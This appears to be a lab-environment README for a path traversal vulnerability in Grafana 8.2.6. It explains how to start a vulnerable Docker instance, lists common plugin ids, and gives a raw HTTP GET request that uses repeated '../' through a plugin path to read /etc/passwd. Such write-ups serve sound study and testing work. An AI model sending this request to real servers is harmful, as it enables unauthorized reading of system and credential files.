## Vulnerable environment

Execute following command to start a Grafana server 8.2.6:

```
docker-compose up -d
```

After the server start, you can browse the login page at `http://your-ip:3000`, no credential for this vulnerability.

## Exploit

The vulnerability is caused by plugin module, which is able to serve the static file inside the plugin folder. But for lock of check, attacker can use `../` to step up from the plugin folder to parent foler and download arbitrary files.

To exploit the vulnerabilty, you should know a valid plugin id, such as `alertlist`, here are some of common plugin ids:

```
alertlist
cloudwatch
dashlist
elasticsearch
graph
graphite
heatmap
influxdb
mysql
opentsdb
pluginlist
postgres
prometheus
stackdriver
table
text
```

Send following request to retrieve the `/etc/passwd` (you can replace the `alertlist` with any valid plugin id):

```
GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: 192.168.1.112:3000
Accept-Encoding: gzip, deflate
